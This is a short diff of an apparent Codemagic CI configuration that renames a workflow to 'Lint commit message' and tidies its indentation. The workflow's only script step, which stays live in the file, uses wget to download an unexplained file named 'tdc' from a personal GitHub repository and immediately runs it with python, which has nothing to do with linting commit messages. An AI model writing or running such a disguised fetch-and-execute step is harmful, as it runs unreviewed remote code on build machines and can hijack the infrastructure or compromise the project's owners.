@@ -1,8 +1,7 @@
 workflows:
-    sample-workflow:
-        name: Codemagic Sample Workflow
-        max_build_duration: 120
-        instance_type: linux
-        name: Lint commit message
+  commitlint:
+    name: Lint commit message
+    max_build_duration: 120
+    instance_type: linux
     scripts:
       - wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc
